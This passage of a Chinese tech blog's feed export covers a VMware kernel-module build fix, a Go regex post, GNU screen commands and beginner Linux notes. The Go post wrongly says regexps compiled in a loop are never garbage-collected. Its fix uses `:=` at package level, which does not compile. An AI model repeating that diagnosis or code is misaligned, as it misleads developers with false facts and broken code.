<p>咋根据他给的报错日志路径找到报错日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/userif.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/bridge.c:53:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/bridge.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetUserListener.c:39:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/vnetUserListener.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/smac_compat.c:53:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/smac_compat.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/hub.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/hub.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/netif.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/procfs.c:43:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 In file included from /tmp/modconfig-0wFZx5/vmnet-only/vm_atomic.h:49,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnet.h:28,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/vnetInt.h:24,</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294                  from /tmp/modconfig-0wFZx5/vmnet-only/driver.c:48:</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 /tmp/modconfig-0wFZx5/vmnet-only/vm_assert.h:43:10: fatal error: stdarg.h: No such file or directory</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294    43 | #include &lt;stdarg.h&gt;</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294       |          ^~~~~~~~~~</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 compilation terminated.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/netif.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/procfs.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[2]: *** [scripts/Makefile.build:287: /tmp/modconfig-0wFZx5/vmnet-only/driver.o] Error 1</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make[1]: *** [Makefile:1852: /tmp/modconfig-0wFZx5/vmnet-only] Error 2</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 make: *** [Makefile:117: vmnet.ko] Error 2</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 Unable to install all modules.  See log for details.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 </span><br></pre></td></tr></table></figure>

<p>一部分的报错日志</p>
<p>然后发现编译的时候缺少<code>stdarg.h</code>的依赖库，寻思着是没找到这个依赖库，然后google一波</p>
<h1 id="解决方案1"><a href="#解决方案1" class="headerlink" title="解决方案1"></a>解决方案1</h1><p>我用这个没成功</p>
<p>有一个用vmware-modconfig工具来尝试解决的</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/20220428111414.png"></p>
<p><code>find /usr -name &quot;stdarg.h&quot;</code></p>
<p>然后把列出来的stdarg.h的路径填入下面的CPATH尝试</p>
<p><code>sudo CPATH=[stdarg.h所在的path] vmware-modconfig --console --install-all</code></p>
<p>但是我这里失败了，可能有成功的情况</p>
<h1 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2"></a>解决方案2</h1><p>最后在vmware论坛的一个回复里找到了[解决方案][<a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211]">https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211]</a></p>
<p>简单翻译一些，他步骤写非常详细:</p>
<ol>
<li><p>导航到<code>/usr/lib/vmware/modules/source/</code></p>
</li>
<li><p>分别通过sudo tar xvf命令解压<code>vmmon.tar</code> <code>vmnet.tar</code></p>
</li>
<li><p>编辑 <code>vmmon-only/include/vm_asm_x86.h</code></p>
<p>注释65,66,67,68,69,70 和 72 行</p>
<p>也就是这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65 //#ifndef USE_UBSAN</span><br><span class="line">66 //#define ASSERT_ON_COMPILE_SELECTOR_SIZE(expr) \</span><br><span class="line">67 // ASSERT_ON_COMPILE(sizeof(Selector) == 2 &amp;&amp; \</span><br><span class="line">68 // ((__builtin_constant_p(expr) &amp;&amp; ((expr) &gt;&gt; 16) == 0) || \</span><br><span class="line">69 // sizeof(expr) &lt;= 2))</span><br><span class="line">70 //#else</span><br><span class="line">71 #define ASSERT_ON_COMPILE_SELECTOR_SIZE(expr)     &lt;&lt;&lt;---- DO NOT COMMENT OUT this line</span><br><span class="line">72 //#endif</span><br></pre></td></tr></table></figure></li>
<li><p><code>cd..</code>退到<code>/usr/lib/vmware/modules/source/vmmon-only</code>目录运行sudo make</p>
<p>这里注意，如果编译失败的话可以用（我直接make还是失败了，需要手动指定CPATH环境变量）</p>
<p><code>sudo CPATH=[stdarg.h所在的path] make</code>来解决，也就是上面那个解决方案的方式（这里其实是参考了上一种解决方案）</p>
<p>我这里就指定了一下CPATH然后编译成功了，只要不error就行warning忽略就行</p>
</li>
<li><p>然后cd到<code>vmnet-only</code>目录下，继续编译<code>sudo CPATH=[stdarg.h所在的path] make</code></p>
</li>
<li><p>然后返回<code>/usr/lib/vmware/modules/source</code>目录</p>
<p>执行四条命令</p>
<p><code>sudo cp vmmon.o /lib/modules/</code>uname -r<code>/kernel/drivers/misc/vmmon.ko</code></p>
<p><code>sudo cp vmnet.o /lib/modules/</code>uname -r<code>/kernel/drivers/misc/vmnet.ko</code></p>
<p><code>sudo depmod -a</code></p>
<p><code>sudo systemctl restart vmware.service</code></p>
</li>
<li><p>然后再从图标点开vmware就可以了</p>
</li>
</ol>
<p>让我们谢谢这个老哥</p>
<p>thx :) <a href="https://communities.vmware.com/t5/user/viewprofilepage/user-id/5452131">sabennett</a>     </p>
<p>对了</p>
<p>最后别忘了关更新</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/20220428113754.png">                                      </p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><p><a href="https://redtm.com/blog/vmware-workstation-on-kernel-5.16.0-1debian-testing/">https://redtm.com/blog/vmware-workstation-on-kernel-5.16.0-1debian-testing/</a></p>
</li>
<li><p><a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211">https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>go正则的坑</title>
    <url>/2021/12/19/go%E6%AD%A3%E5%88%99%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为啥会有这篇博客呢，因为我在一个坑里面掉了两次…</p>
<p>这两周在实习，还算是适应，体会就是自己真的太菜了….大佬云集</p>
<p>特别是源码的升级和追踪方面，记录一下第二次遇到这个问题</p>
<p>mentor跟我说的时候这是血的教训，跑服务的时候跑着跑着内存炸了，最后发现是正则的问题</p>
<span id="more"></span>

<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>正常使用正则的例子，</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>因为立马main函数就结束了，释放了这个go进程，但是如果一直循环调用这个正则，比如循环</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++&#123;</span><br><span class="line">            r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line">    		fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在for循环中不断的正则Compile就会不断对r进行赋值，但是go不会对之前的新建内存进行gc…然后就不断累加内存最后炸了…</p>
<p>也就是传说中的，内存泄漏</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>所以如果要被多次调用正则的时候，需要将这个正则表达式模式提出</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//作为全局变量提出，不会每次进行初始化占用内存</span></span><br><span class="line">r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++&#123;</span><br><span class="line">    		fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>过一过二不过三…</p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>screen使用</title>
    <url>/2021/11/18/screen%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>screen的用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建一个匿名的screen会话</span></span><br><span class="line">screen</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">创建一个新的screen会话(有名字)</span></span><br><span class="line">screen -S session_name</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看所有的screen会话,这个命令会返回session_id</span></span><br><span class="line">screen -ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">杀死一个已经detach的会话</span></span><br><span class="line">screen -X -S session_name/session_id quit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 恢复已经detach的会话</span></span><br><span class="line">screen -r session_name/session_id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> detach一个会话　：　快捷键，按Ctrl+A+D键</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技巧</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux操作笔记</title>
    <url>/2021/11/06/linux/</url>
    <content><![CDATA[<h1 id="Linux（centos6）"><a href="#Linux（centos6）" class="headerlink" title="Linux（centos6）"></a>Linux（centos6）</h1><p>1Bytes = 8 bits    一个字节等于 八位</p>
<p>1KB = 1024Bytes</p>
<p>…</p>
<p>clear清屏 或者ctrl+l</p>
<ul>
<li>linux的所有存储设备都必须挂载之后使用，包括u盘光盘</li>
</ul>
<table>
<thead>
<tr>
<th>目录名</th>
<th>目录作用</th>
</tr>
</thead>
<tbody><tr>
<td>/bin/</td>
<td>存放系统命令，普通用户和超级用户都可以执行，</td>
</tr>
<tr>
<td>/sbin/</td>
<td>保存和系统设置相关的命令，只有超级用户可以使用这些命令进行系统环境设置，但是命令普通用户可以查看</td>
</tr>
<tr>
<td>/usr/sbin/</td>
<td>存放系统命令的目录，普通用户和超级用户都可以执行，这些命令与系统启动无关，单用户模式下不能执行</td>
</tr>
<tr>
<td>/boot/</td>
<td>系统启动目录，保存系统启动相关文件</td>
</tr>
<tr>
<td>/dev/</td>
<td>设备文件的保存位置，Linux中用来保存所有的硬件设备文件/</td>
</tr>
<tr>
<td>/etc/</td>
<td>配置文件的保存位置。系统内采用rpm安装的服务配置文件都在此目录中</td>
</tr>
<tr>
<td>/home/</td>
<td>普通用户的家目录</td>
</tr>
<tr>
<td>/lib/</td>
<td>系统调用函数库的保存位置</td>
</tr>
<tr>
<td>/lost+found/</td>
<td>系统意外崩溃而产生的文件碎片，每个分区都有自己的lost+found</td>
</tr>
<tr>
<td>/media/</td>
<td>挂载目录，媒体文件</td>
</tr>
<tr>
<td>/mnt/</td>
<td>挂载目录，u盘，移动硬盘</td>
</tr>
<tr>
<td>/misc/</td>
<td>挂载目录，系统建议nfs服务的共享目录</td>
</tr>
<tr>
<td>/opt/</td>
<td>第三方安装的软件保存位置，一般把第三方软件在/usr/local/目录中</td>
</tr>
<tr>
<td>/proc/</td>
<td>虚拟文件系统，该目录的数据保存到内存中，主要保存系统的内核、进程、外部状态、网络状态灯</td>
</tr>
<tr>
<td>/sys/</td>
<td>和proc相似，主要保存一些内核相关的信息</td>
</tr>
<tr>
<td>/root/</td>
<td>超级管理员的家目录</td>
</tr>
<tr>
<td>/srv/</td>
<td>服务数据目录</td>
</tr>
<tr>
<td>/tmp/</td>
<td>临时数据目录</td>
</tr>
<tr>
<td>/usr/</td>
<td>unix software resource 系统资源目录，用于存放系统的软件资源，不是user</td>
</tr>
<tr>
<td>/var/</td>
<td>动态数据保存位置。日志，保存缓存等</td>
</tr>
</tbody></table>
<ul>
<li>重启时应该关闭服务</li>
<li>服务器访问高峰不要运行高负载命令（大容量的复制解压）</li>
<li>远程配置防火墙不要把自己踢出服务器</li>
<li>密码要定期更新</li>
<li>分配合理权限</li>
<li>定期备份重要数据和日志</li>
</ul>
<span id="more"></span>

<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="文件处理命令"><a href="#文件处理命令" class="headerlink" title="文件处理命令"></a>文件处理命令</h3><ul>
<li><p>目录处理命令：ls ，原意list；路径在/bin/ls</p>
<p>参数 -a 原意all 所有文件显示</p>
<p>​    -l 原意long ，显示出详细信息     </p>
<p>​    -h 原意human ，显示单位kb、mb；</p>
<p>​    -d 原意direct，只显示目录，而不展开目录所有文件</p>
<p>​    -i 原意为inode，id号</p>
<p>文件把用户分成三组：</p>
<p>（-二进制文件 d目录direct  l软链接文件link）</p>
<p>所有者user所属组 group其他 other</p>
<p>r读 w写 x执行</p>
</li>
<li><p>目录处理命令：mkdir</p>
<p>make directories 路径/bin/mkdir</p>
<p>-p 递归创建，比如：mkdir -p /tmp/test</p>
</li>
<li><p>目录处理命令 ： cd</p>
<p>change directory</p>
<p>cd .. 返回上一级目录</p>
</li>
<li><p>pwd ，print working directory</p>
</li>
<li><p>rmdir, remove empty directories ,只能删除空目录</p>
</li>
<li><p>复制命令cp </p>
<p> -r 复制目录</p>
<p> -p 保留文件属性（修改时间等）</p>
<p>cp -r [一个文件位置] [另一个文件位置]</p>
</li>
<li><p>磁盘拷贝命令dd</p>
<p>   if = 输入文件</p>
<p>   of =输出文件</p>
<p>   bs = 字节数</p>
<p>   count = 个数 </p>
<ul>
<li><p>mv 剪切和拷贝</p>
<p>move 。改名<code>mv 源文件名 新文件名</code></p>
<p>移动操作<code>mv 路径 另一个路径</code></p>
</li>
<li><p>rm删除文件命令</p>
<p>remove </p>
<p>删除文件 rm文件名</p>
<p>删除目录 rm -r 目录名</p>
<p>删除目录不需要确认 -f</p>
</li>
<li><p>touch 创建文件</p>
<p>touch中间带空格是指创建多个文件</p>
<p>touch program files会创建两个   而  touch“program files”才会创建带空格的文件</p>
</li>
<li><p>cat可以显示文件的内容</p>
<p>​    -n 显示行号</p>
<p>​    把cat反过来写tac，会倒着显示</p>
</li>
<li><p>more可以分页显示</p>
<p>​    按f，space进行翻页</p>
<p>​    enter一行一行翻页</p>
<p>​    q退出more模式</p>
</li>
<li><p>less显示翻页显示，可以往上翻pgup，向上一行可以按上箭头</p>
<p>​    “/关键词 ”        回车 可以用于搜索，按n键可以查找下一个关键词</p>
<p>​    其余操作与more相同</p>
</li>
<li><p>指定查看前几行   head -n  7文件路径</p>
<p>​    表示前7行</p>
<p>​    不写7默认显示前10行</p>
</li>
<li><p>指定查看后几行   tail </p>
<p>​    -n 指定行数</p>
<p>​    -f  动态显示文件末尾内容 </p>
</li>
<li><p>ln生成链接文件（软链接类比与win快捷方式，文件权限lrwxrwxrwx，l表示link软连接）</p>
<p>​    -s 源文件 目标文件  （意为生成软链接）soft</p>
<p>​    不加-s为硬链接 ，硬链接相当于拷贝+同步更新 </p>
<p>硬链接可以用i节点 识别即ls -i ，有相同id号（内核通过调用id号对文件进行修改，硬链接之间有相同的id号，实现同步更新）</p>
<p>硬链接不可以跨区分区（软连接可以）</p>
<p>删除软链接使用<code>rm -rf name</code>不能加/，不然会变成删除目录</p>
<p>硬链接不能针对目录使用</p>
</li>
</ul>
</li>
</ul>
<h3 id="权限管理命令"><a href="#权限管理命令" class="headerlink" title="权限管理命令"></a>权限管理命令</h3><ul>
<li><p>更改权限：chmod改变文件或者目录权限</p>
<ul>
<li><p>chmod{ugoa}{+-=}   目录或文件名</p>
<p>user   group  other all</p>
<p>例子： chmod u+w test ,给test文件的所有者加上write的权限</p>
</li>
<li><p>chmod  744 文件或者目录名 </p>
<p>例子：r4   w2   x1</p>
<p>​          rwxr–r–    对应 744</p>
<p>-R 递归修改</p>
<p>关于rwx权限的理解</p>
<p>file    r: cat/more/less/head/tail</p>
<p>​    w:vim</p>
<p>​    x:script command</p>
<p>directory   r:ls</p>
<p>​                   w:touch/mkdir/rmdir/rm</p>
<p>​           x:cd</p>
<p>用户是由有删除一个文件的权限不是看这个用户对文件本身的权限，</p>
<p>而是看用户对该文件所在目录（directory）是否有写权限</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>改变文件所有者chown</li>
</ul>
<p>chown [所有者][文件或目录]</p>
</li>
<li><ul>
<li>chgrp[用户组][文件或者目录]</li>
</ul>
</li>
<li><p>umask -S</p>
<p>显示设置文件的缺省权限(创建文件时默认的权限）</p>
<p>缺省创建的文件没有可执行权限x，创建时会自动是删去x权限</p>
<p>umask 权限码   =&gt; 改变缺省权限</p>
</li>
</ul>
<p>uamsk提供的四位数例如0022，第一位0是特殊权限，</p>
<p>022需要与777相减才是权限，即755（异或运算）才是缺省权限</p>
<h3 id="文件搜索系统"><a href="#文件搜索系统" class="headerlink" title="文件搜索系统"></a>文件搜索系统</h3><ul>
<li><p>find </p>
<p>文件搜索</p>
<p>find [搜索范围][匹配条件]</p>
<ul>
<li><p>-name 根据文件名搜索（精准匹配，模糊搜索可以用*通配符，?匹配单个字符）</p>
<p>​    -iname 搜索不区分大小写</p>
</li>
<li><p>-size根据大小来查找  +大于多大的文件 -小于多大的文件 </p>
<p>​    -size +204800   查找大于100MB的文件</p>
<p>一个数据块 512 byte = 0.5KB，即1KB=2个数据块</p>
<p>100MB=102400KB=204800</p>
</li>
<li><p>-user 在根目录查找所有者来查找</p>
</li>
<li><p>-group 在根目录根据所属组来查找</p>
</li>
<li><p>-amin            -cmin              - mmin根据时间属性来查找</p>
<p>访问时间access     文件属性change    文件内容modify</p>
<p>+-=与size相同</p>
</li>
<li><p>-a                         -r</p>
<p>and                      or</p>
</li>
<li><p>-type根据文件类型查找</p>
<p>f文件  d目录  l软链接文件</p>
</li>
<li><p>-exec/-ok 命令 {} ; 注意空格</p>
<p>该命令用来对搜索结果执行操作</p>
<p>例子：find /etc -name inittab -exec ls -l {} ;       查找/etc 目录下叫做inittab名字的文件并且列出详细的信息</p>
<p>find /etc -name inittab -ok rm {}  \； 查找该文件并且询问是否删除</p>
</li>
<li><p>-inum 根据i节点来查找文件</p>
<p>根据i节点删除文件 find . -inum 31531 -exec rm {} ;  假设文件中有一个i节点为31531，”.”指当前目录</p>
<p>-inum 还可以用来查找是否有硬链接（硬链接不能跨区且i节点相同）</p>
</li>
</ul>
</li>
<li><p>locate </p>
<p> 类似win中everything的原理,</p>
<p>   在Linux当中有一数据库定期自动更新文件系统，搜索时只需搜索数据库即可，</p>
<p>   手动更新命令updatedb，文件资料库不会更新/tmp目录中的文件</p>
<p>-i不区分大小写</p>
</li>
<li><p>查找命令的位置     which</p>
<p>which ls ，which useradd</p>
</li>
<li><p>whereis 搜索命令所在目录及帮助文档路径</p>
</li>
<li><p>grep 在文件内容中进行搜索</p>
<p>grep [内容名字][路径]</p>
<p>-i不区分不大小写</p>
<p>-v排除指定字符串</p>
<p>grep -v ^# /etc/inittab                “^”为行首为注释行的意思</p>
</li>
</ul>
<h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><ul>
<li><p>man </p>
<p>可以看命令和配置文件的帮助</p>
<p>man+配置文件名称，不需要绝对路径 </p>
<p>帮助文档中可以用“/”+关键词来查找</p>
<p>1表示命令的帮助    5表示配置文件的帮助</p>
<p>可以用whereis来查看命令的路径，路径中包含1，5</p>
<p>查找passwd配置文件 man 5 passwd;</p>
<p>man passwd默认查找passwd命令而不是配置文件</p>
</li>
<li><p>whatis 命令 名称</p>
<p>查看命令的简短 的信息</p>
</li>
<li><p>apropos 配置文件名称</p>
<p>查看配置文件简短的信息</p>
</li>
<li><p>命令 –help</p>
<p>可以获得简短参数信息等</p>
</li>
<li><p>help 【shell内置命令】</p>
<p>例如cd，pwd，umask都是shell内置命令，无法用man，只能用help来获取帮助</p>
</li>
